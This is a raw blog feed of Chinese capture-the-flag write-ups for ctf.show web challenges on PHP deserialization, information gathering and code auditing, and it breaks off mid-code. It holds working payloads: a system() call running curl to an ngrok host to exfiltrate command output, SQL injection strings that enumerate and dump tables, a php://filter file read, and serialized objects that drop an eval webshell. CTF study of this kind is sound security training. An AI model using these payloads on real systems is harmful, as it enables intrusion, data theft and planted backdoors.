invoke__">reload</span>();</span><br><span class="line"><span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;reload done&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flsaaag`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec</span></span><br></pre></td></tr></table></figure><h1 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>==<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=admin&amp;p=phpinfo</span><br></pre></td></tr></table></figure><p>先进入第二个语句,phpinfo执行结果为true</p><h1 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=admin&amp;p=get_class</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_class (): 获取当前调用方法的类名； </span><br><span class="line">get_called_class():获取静态绑定后的类名；</span><br></pre></td></tr></table></figure><h1 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 13:25:16</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">copy</span>(<span class="variable">$u</span>, <span class="variable">$p</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php&amp;p=1</span></span><br></pre></td></tr></table></figure><p>直接读取读不到php文件,所以进行一下base64编码</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>右键源代码</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261824762.png" alt="image-20220326182418721"></p><p>ctrl+u</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203261824841.png" alt="image-20220326182454792"></p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>curl + u </p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292136713.png" alt="image-20220329213624668"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203292136889.png" alt="image-20220329213600822"></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312211924.png" alt="image-20220331221134879"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203312211868.png" alt="image-20220331221140789"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计</title>
      <link href="/ctfshow/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/ctfshow/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271927257.png" alt="image-20220327192703217"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271927314.png" alt="image-20220327192725282"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203271928218.png" alt="image-20220327192821196"></p><p>好多php</p><p>checklogin.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;<span class="comment">#无过滤sql注入</span></span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;<span class="comment">#没取到就回去登录去</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="comment">#这里如果传入的passwd是1,且查询出来的也是1就登录成功,那么直接使用联合注入查一个一出来就好</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;<span class="comment">#比较userpwd和从数据库里取出来的sds_password的值相等就登录成功,不区分大小写</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>映入眼帘的sql注入,没过滤单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">userid=-1&#x27;union select 1 from sds_user%23&amp;userpwd=1&amp;userpwd=1</span><br></pre></td></tr></table></figure><h1 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311327165.png" alt="image-20220331132735111"></p><p>告诉了修改的地方</p><p>fun.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;<span class="comment">#$str是用户输入的</span></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;<span class="comment">#先对sds base64加密在MD5在与输入相连在MD5在与sds像连在MD5</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么如果输入密码是1的话就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sds-&gt;c2Rz-&gt;7e460169ddd8e459904627de0afe058e-&gt;17e460169ddd8e459904627de0afe058e-&gt;876c2c5e063cc5e89b1997427b8127dc-&gt;876c2c5e063cc5e89b1997427b8127dcsds-&gt;d9c77c4e454869d5d8da3b4be79694d3</span><br></pre></td></tr></table></figure><p>使用hackerbar成功不了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select &quot;d9c77c4e454869d5d8da3b4be79694d3&quot;#</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311353029.png" alt="image-20220331135335974"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203311353906.png" alt="image-20220331135341775"></p><h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414203400434.png" alt="image-20220414203400434"></p><p>admin admin 弱口令登进去了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414203452997.png" alt="image-20220414203452997"></p><p>这里存在明显注入点</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414203557337.png" alt="image-20220414203557337"></p><p>这里进行了回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select database())#</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414203803823.png" alt="image-20220414203803823"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414203827112.png" alt="image-20220414203827112"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>sds_fl9g<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select flag from sds_fl9g)#</span></span><br></pre></td></tr></table></figure><h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">增加了全局waf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|-/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414204444737.png" alt="image-20220414204444737"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414204448997.png" alt="image-20220414204448997"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>sds_flaag<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,sds_address =(select flag from sds_flaag)#</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414204556753.png" alt="image-20220414204556753"></p><h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414204756442.png" alt="image-20220414204756442"></p><p>有waf但是在class.php</p><p>checklogin.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;fun.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-17 13:20:37</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-17 13:33:21</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;username, <span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;zf.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span>  = <span class="keyword">new</span> <span class="title class_">user</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22zf.php%22%3Bs%3A8%3A%22password%22%3Bs%3A26%3A%22%3C%3Fphp+%40eval%28%24_POST%5Bzf%5D%29%3B%3F%3E%22%3B%7D</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>去checklogin.php登录哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414212700875.png" alt="image-20220414212700875"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414212707269.png" alt="image-20220414212707269"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414213059226.png" alt="image-20220414213059226"></p><p>为啥给的不对,还有要用mysqli</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414213129873.png" alt="image-20220414213129873"></p><h1 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414213739951.png" alt="image-20220414213739951"></p><p>搜一下class看看有没有能用的</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414213933273.png" alt="image-20220414213933273"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414213941190.png" alt="image-20220414213941190"></p><p>简单反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">log</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$title</span>=<span class="string">&#x27;zf.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$info</span>=<span class="string">&#x27;&lt;?php @eval($_POST[zf]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dao</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span 